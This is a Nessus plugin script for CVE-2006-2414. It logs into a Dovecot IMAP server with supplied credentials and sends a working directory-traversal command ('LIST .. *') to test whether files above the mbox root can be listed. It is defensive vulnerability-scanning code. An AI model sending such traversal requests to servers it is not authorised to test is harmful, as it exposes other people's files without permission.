#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21559);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2013/01/11 22:59:17 $");

  script_cve_id("CVE-2006-2414");
  script_bugtraq_id(17961);
  script_osvdb_id(25727);

  script_name(english:"Dovecot Multiple Command Traversal Arbitrary Directory Listing");
  script_summary(english:"Tries to list contents of mbox root parent directory in Dovecot");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Dovecot, an open source IMAP4 / POP3 server
for Linux / Unix. 

The version of Dovecot installed on the remote host fails to filter
directory traversal sequences from user-supplied input to IMAP
commands such as LIST and DELETE.  An authenticated attacker may be
able to leverage this issue to list directories and files in the mbox
root's parent directory or possibly to delete index files used by the
application.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/433878/100/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.dovecot.org/list/dovecot/2006-May/013385.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Dovecot version 1.0 beta8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/15");
  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dovecot:dovecot");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner corresponds to Dovecot.
if (report_paranoia < 2)
{
  banner = get_imap_banner(port:port);
  if (!banner || "Dovecot ready" >!< banner) exit(0);
}


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}
s = chomp(s);


# Log in.
#
# - try the PLAIN SASL mechanism.
#   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
#       it may also require SSL / TLS encapsulation.
++tag;
c = string("a", string(tag), ' AUTHENTICATE "PLAIN"');
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
s = chomp(s);
if (s == "+")
{
  c = base64(str:raw_string(0, user, 0, pass));
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024, timeout:1))
  {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
    resp = "";
  }
}
# - if that didn't work, try LOGIN command.
if (isnull(resp))
{
  ++tag;
  c = string("a", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024))
  {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
    resp = "";
  }
}


# If successful, try to exploit the issue to list the mbox root's parent dir.
if (resp && resp =~ "OK")
{
  ++tag;
  c = string("a", string(tag), " LIST .. *");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024))
  {
    s = chomp(s);

    # There's a problem if the listing has a directory traversal sequence.
    if (s =~ '^\\* LIST \\(.+\\) "/" "\\.\\./')
    {
      security_warning(port);
      break;
    }

    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
    resp = "";
  }
}
else
{
  exit(1, "Could not login with supplied IMAP credentials");
}


# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024))
{
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m))
  {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
